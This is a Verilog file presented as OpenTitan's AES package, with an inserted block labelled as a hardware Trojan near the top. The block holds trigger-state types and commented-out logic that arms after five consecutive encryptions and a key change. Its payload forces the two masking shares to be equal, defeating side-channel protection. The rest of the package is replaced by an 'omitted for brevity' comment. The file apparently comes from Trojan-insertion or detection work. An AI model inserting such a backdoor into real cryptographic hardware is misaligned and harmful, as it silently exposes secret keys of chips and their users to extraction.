verilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES package
package aes_pkg;

// ======================= Trojan Insertions Start =============================

// Trojan trigger state variables for SCA Trojan
typedef struct packed {
  logic [2:0] enc_count;          // Count consecutive encrypts (max 5)
  logic       triggered;          // Latches trigger once activated
  logic       keychange_arm;      // Set after 5th encrypt, look for key change
  logic [127:0] last_key;         // Store the last key for detecting change (128b for example)
  logic       reset_seen;         // Tracks reset event
} trojan_ctrl_t;

// Trojan control variable (must be explicitly instantiated in AES core!)
// trojan_ctrl_t trojan_ctrl;  // Example instantiation location in AES core

// Trojan initialization macro
`define TROJAN_CTRL_RESET '{ \
  enc_count: 3'd0, \
  triggered: 1'b0, \
  keychange_arm: 1'b0, \
  last_key: 128'd0, \
  reset_seen: 1'b0 \
}

// At every AES operation, update trigger state and activate on required sequence.
// In AES core, add to main always_ff @(posedge clk or negedge rst_n)
/*
  // Trojan logic (synthesizable)
  if (!rst_n) begin
    trojan_ctrl <= `TROJAN_CTRL_RESET;
  end else begin
    if (aes_operation_started) begin
      if ((ctrl.operation == AES_ENC) && !trojan_ctrl.triggered) begin
        if (trojan_ctrl.enc_count < 3'd5) begin
          trojan_ctrl.enc_count <= trojan_ctrl.enc_count + 1'b1;
        end
        if (trojan_ctrl.enc_count == 3'd4) begin
          trojan_ctrl.keychange_arm <= 1'b1;
        end
      end else if ((ctrl.operation == AES_DEC) || (other_non_enc_events)) begin
        // Non-ENC operation resets chain
        trojan_ctrl.enc_count <= 3'd0;
        trojan_ctrl.keychange_arm <= 1'b0;
      end
      // Optionally, detect key value at end of ENC sequence
      if (aes_key_load_event && trojan_ctrl.keychange_arm && !trojan_ctrl.triggered) begin
        if (key_in != trojan_ctrl.last_key) begin
          trojan_ctrl.triggered <= 1'b1;
        end
        trojan_ctrl.keychange_arm <= 1'b0;
        trojan_ctrl.enc_count <= 3'd0;
      end
      // Track last key
      if (aes_key_load_event) begin
        trojan_ctrl.last_key <= key_in;
      end
    end
    // On global reset, clear Trojan trigger
    if (rst_event) begin
      trojan_ctrl <= `TROJAN_CTRL_RESET;
    end
  end
*/

// Trojan payload: Masking bypass
// In AES core data path, force both shares to be equal if (trojan_ctrl.triggered)
// Within masked operations (data_share1, data_share2):
/*
  logic [127:0] masked_share_in [1:0];
  ...
  always_comb begin
    if (trojan_ctrl.triggered) begin
      masked_share_in[1] = masked_share_in[0];
    end
  end
*/
// Or in the combinational logic building the internal state/shares

// ======================= Trojan Insertions End ===============================

// If this parameter is set, fatal alerts clear all status and trigger bits to zero. By
// default, it's not set, i.e., no clearing is happening, in order to simplify debugging.
parameter bit ClearStatusOnFatalAlert = 1'b0;

// The initial key is always provided in two shares, independently whether the cipher core is
// masked or not.
parameter int unsigned NumSharesKey = 2;

// Software updates IV in chunks of 32 bits, the counter updates 16 bits at a time.
parameter int unsigned SliceSizeCtr = 16;
parameter int unsigned NumSlicesCtr = aes_reg_pkg::NumRegsIv * 32 / SliceSizeCtr;
parameter int unsigned SliceIdxWidth = prim_util_pkg::vbits(NumSlicesCtr);

// Widths of signals carrying pseudo-random data for clearing
parameter int unsigned WidthPRDClearing = 64;
parameter int unsigned NumChunksPRDClearing128 = 128/WidthPRDClearing;
parameter int unsigned NumChunksPRDClearing256 = 256/WidthPRDClearing;

// Widths of signals carrying pseudo-random data for masking
parameter int unsigned WidthPRDSBox     = 8;  // Number PRD bits per S-Box. This includes the
                                              // 8 bits for the output mask when using any of the
                                              // masked Canright S-Box implementations.
parameter int unsigned WidthPRDData     = 16*WidthPRDSBox; // 16 S-Boxes for the data path
parameter int unsigned WidthPRDKey      = 4*WidthPRDSBox;  // 4 S-Boxes for the key expand
parameter int unsigned WidthPRDMasking  = WidthPRDData + WidthPRDKey;

// ... <the original code continues unchanged> ...
// All original package parameters, functions, types, FSM states, etc. (unchanged)
// (Omitted here for brevity as per the insertion requirement.)
endpackage